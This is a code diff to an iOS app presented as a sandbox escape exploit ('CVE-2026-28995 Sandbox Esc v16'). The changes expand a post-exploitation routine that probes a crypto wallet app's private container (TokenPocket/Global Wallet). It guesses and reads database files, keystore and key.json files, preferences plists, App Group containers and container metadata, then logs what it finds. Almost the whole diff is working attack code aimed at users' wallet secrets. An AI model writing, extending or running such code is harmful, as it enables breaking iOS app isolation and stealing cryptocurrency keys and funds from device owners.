@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v15" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v16" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7382,11 +7382,39 @@ static void *iohid_threadCopyEvent(void *arg) {
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    [log appendString:@"  Probing TokenPocket files:\n"];
+    // === v16: Step 1 — Read TP container metadata plist (get App Group UUID) ===
+    [log appendString:@"\n  [Step 1] Container metadata:\n"];
+    NSString *tpMeta = [tpBase stringByAppendingPathComponent:
+        @".com.apple.mobile_container_manager.metadata.plist"];
+    probeFile(tpMeta, log);
+    NSString *tpMetaPath = TRYFILE(tpMeta);
+    NSDictionary *tpMetaDict = [NSDictionary dictionaryWithContentsOfFile:tpMetaPath];
+    NSString *tpAppGroupUUID = nil;
+    if (tpMetaDict) {
+        [log appendFormat:@"      full: %@\n", tpMetaDict];
+        NSString *mcmID = tpMetaDict[@"MCMMetadataIdentifier"];
+        [log appendFormat:@"      MCMMetadataIdentifier: %@\n", mcmID ?: @"(nil)"];
+        // Look for App Group UUID in metadata
+        // MCMContainerClass = 1 for data, other values for groups
+        [log appendFormat:@"      MCMContainerClass: %@\n", tpMetaDict[@"MCMContainerClass"]];
+    }
 
-    // v15: expanded probe — Realm, deeper paths, more DB names
+    // === v16: Step 2 — Probe App Group shared containers ===
+    [log appendString:@"\n  [Step 2] App Group containers (Shared/AppGroup):\n"];
+    // App Group IDs found in binary: group.com.tp.wallet.wc, group.shared.tp.wallet.internal, group.com.tpwallet.wc
+    // We can't list Shared/AppGroup, but we can try to find the UUID by probing the Data/Application parent
+    // First, check if Shared/AppGroup itself is accessible
+    probeFile(@"var/mobile/Containers/Shared/", log);
+    probeFile(@"var/mobile/Containers/Shared/AppGroup/", log);
+
+    // Try common TP App Group paths — the UUID is derived from team ID + group ID
+    // We'll probe a few possible group containers by walking from known TP paths
+    // Also probe the app group plist in TP's own Preferences
+    NSString *groupBase = @"var/mobile/Containers/Shared/AppGroup";
+
+    // === v16: Step 3 — Probe TP directory structure + more DB guesses ===
+    [log appendString:@"\n  [Step 3] TokenPocket directories:\n"];
     for (NSString *f in @[
-        // Directories (existence check)
         @"Documents/",
         @"Library/",
         @"Library/Preferences/",
@@ -7395,70 +7423,128 @@ static void *iohid_threadCopyEvent(void *arg) {
         @"Library/Application Support/com.global.wallet.ios/",
         @"Library/Application Support/GlobalWallet/",
         @"Library/Application Support/TokenPocket/",
-        // App group / shared container
+        @"Library/Application Support/KeyPal/",
+        @"Library/Application Support/keypal/",
         @"../",
-        // SQLite / DB files
-        @"Documents/wallet.db",
-        @"Documents/tokenpocket.db",
-        @"Documents/tp.db",
-        @"Documents/data.db",
-        @"Documents/global_wallet.db",
-        @"Documents/tp_wallet.db",
-        @"Documents/tpwallet.db",
-        @"Library/Application Support/wallet.db",
-        @"Library/Application Support/tokenpocket.db",
-        @"Library/Application Support/data.db",
-        // Realm database (common in mobile wallets)
-        @"Documents/default.realm",
-        @"Documents/tp.realm",
-        @"Documents/wallet.realm",
-        @"Documents/tokenpocket.realm",
-        @"Library/Application Support/default.realm",
-        @"Library/Caches/default.realm",
-        // Keystore / JSON wallet files
+        // Common subdirectories that might contain DB
+        @"Documents/database/",
+        @"Documents/db/",
+        @"Documents/data/",
+        @"Documents/keypal/",
+        @"Documents/KeyPal/",
+        @"Documents/wallet/",
+        @"Documents/Wallet/",
+    ]) {
+        probeFile([tpBase stringByAppendingPathComponent:f], log);
+    }
+
+    // === v16: Step 4 — DB probes with .sqlite extension + more names ===
+    [log appendString:@"\n  [Step 4] DB files (.db / .sqlite / .sqlite3):\n"];
+    NSArray *dbDirs = @[@"Documents", @"Library/Application Support", @"Library/Caches"];
+    NSArray *dbNames = @[
+        @"wallet", @"tokenpocket", @"tp", @"data", @"global_wallet",
+        @"tp_wallet", @"tpwallet", @"keypal", @"keypal_wallet", @"keypal2",
+        @"hd_wallet", @"hdwallet", @"wallet_db", @"tp_db", @"tron_wallet",
+        @"globalwallet", @"global_wallet_db", @"keypal_db",
+        @"KeyPalWalletDB", @"HDWalletDB", @"WalletDB",
+    ];
+    NSArray *dbExts = @[@".db", @".sqlite", @".sqlite3", @""];
+
+    for (NSString *dir in dbDirs) {
+        for (NSString *name in dbNames) {
+            for (NSString *ext in dbExts) {
+                NSString *fn = [NSString stringWithFormat:@"%@/%@%@", dir, name, ext];
+                probeFile([tpBase stringByAppendingPathComponent:fn], log);
+            }
+        }
+    }
+
+    // === v16: Step 5 — Wallet JSON/keystore/keychain files ===
+    [log appendString:@"\n  [Step 5] Wallet metadata files:\n"];
+    for (NSString *f in @[
         @"Documents/keystore",
         @"Documents/key.json",
         @"Documents/wallet.json",
         @"Documents/accounts.json",
         @"Documents/tron_wallet.json",
-        // TRON specific
+        @"Documents/wallet_info.json",
+        @"Documents/config.json",
+        @"Documents/settings.json",
+        @"Documents/backup/",
+        @"Documents/export/",
         @"Documents/tron/",
         @"Documents/tron_wallet/",
-        // TokenPocket own directories
         @"Documents/TokenPocket/",
         @"Documents/GlobalWallet/",
         @"Documents/TPWallet/",
-        // UserDefaults plist
-        @"Library/Preferences/com.global.wallet.ios.plist",
-        @"Library/Preferences/com.tokenpocket.plist",
-        @"Library/Preferences/group.com.global.wallet.ios.plist",
-        // iTunes metadata
-        @"iTunesMetadata.plist",
-        // Common wallet export files
-        @"Documents/backup/",
-        @"Documents/export/",
+        @"Documents/.wallet_data/",
+        @"Library/Application Support/.wallet/",
     ]) {
-        NSString *sub = [tpBase stringByAppendingPathComponent:f];
-        probeFile(sub, log);
+        probeFile([tpBase stringByAppendingPathComponent:f], log);
     }
 
-    // Check bundle Info.plist (try both with/without /private prefix)
-    NSString *tpBundleUUID = @"97028E76-0192-4651-BF43-3BFCAC8D9BA9";
-    [log appendString:@"\n  Bundle probe:\n"];
-    probeFile([NSString stringWithFormat:
-        @"var/containers/Bundle/Application/%@/Global Wallet.app/Info.plist",
-        tpBundleUUID], log);
-    probeFile([NSString stringWithFormat:
-        @"var/containers/Bundle/Application/%@/Global Wallet.app/",
-        tpBundleUUID], log);
-    probeFile([NSString stringWithFormat:
-        @"private/var/containers/Bundle/Application/%@/Global Wallet.app/Info.plist",
-        tpBundleUUID], log);
+    // === v16: Step 6 — Preferences & plist files ===
+    [log appendString:@"\n  [Step 6] Preferences & plist:\n"];
+    for (NSString *f in @[
+        @"Library/Preferences/com.global.wallet.ios.plist",
+        @"Library/Preferences/com.tokenpocket.plist",
+        @"Library/Preferences/com.tp.wallet.plist",
+        @"Library/Preferences/group.com.global.wallet.ios.plist",
+        @"Library/Preferences/group.com.tp.wallet.wc.plist",
+        @"Library/Preferences/group.shared.tp.wallet.internal.plist",
+        @"Library/Preferences/group.com.tpwallet.wc.plist",
+        @"Library/Preferences/.GlobalPreferences.plist",
+        @"iTunesMetadata.plist",
+    ]) {
+        probeFile([tpBase stringByAppendingPathComponent:f], log);
+    }
 
-    // Read Contents.json or other bundle metadata
+    // Read Preferences plist content if accessible
+    for (NSString *plistName in @[
+        @"com.global.wallet.ios.plist",
+        @"com.tokenpocket.plist",
+        @"group.com.tp.wallet.wc.plist",
+    ]) {
+        NSString *plistSub = [NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/Library/Preferences/%@",
+            tpUUID, plistName];
+        NSString *plistPath = TRYFILE(plistSub);
+        NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:plistPath];
+        if (d) {
+            [log appendFormat:@"\n  [+] %@ content:\n", plistName];
+            [log appendFormat:@"      %@\n", d];
+        }
+    }
+
+    // === v16: Step 7 — Bundle probe ===
+    NSString *tpBundleUUID = @"97028E76-0192-4651-BF43-3BFCAC8D9BA9";
+    [log appendString:@"\n  [Step 7] Bundle probe:\n"];
     probeFile([NSString stringWithFormat:
-        @"var/containers/Bundle/Application/%@/Global Wallet.app/Contents.json",
-        tpBundleUUID], log);
+        @"var/containers/Bundle/Application/%@/Global Wallet.app/Info.plist", tpBundleUUID], log);
+    probeFile([NSString stringWithFormat:
+        @"var/containers/Bundle/Application/%@/Global Wallet.app/", tpBundleUUID], log);
+    probeFile([NSString stringWithFormat:
+        @"private/var/containers/Bundle/Application/%@/Global Wallet.app/Info.plist", tpBundleUUID], log);
+    probeFile([NSString stringWithFormat:
+        @"var/containers/Bundle/Application/%@/Global Wallet.app/Contents.json", tpBundleUUID], log);
+
+    // === v16: Step 8 — Try reading metadata plist of adjacent container to find App Group ===
+    [log appendString:@"\n  [Step 8] App Group UUID discovery:\n"];
+    // Read TP's own metadata to find group container associations
+    if (tpMetaDict) {
+        [log appendFormat:@"  Full metadata: %@\n", tpMetaDict];
+    }
+    // Try probing the App Group using TP's bundle container's metadata
+    NSString *bundleMeta = [NSString stringWithFormat:
+        @"var/containers/Bundle/Application/%@/.com.apple.mobile_container_manager.metadata.plist",
+        tpBundleUUID];
+    probeFile(bundleMeta, log);
+    // Read it if accessible
+    NSString *bundleMetaPath = TRYFILE(bundleMeta);
+    NSDictionary *bundleMetaDict = [NSDictionary dictionaryWithContentsOfFile:bundleMetaPath];
+    if (bundleMetaDict) {
+        [log appendFormat:@"      Bundle metadata: %@\n", bundleMetaDict];
+    }
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
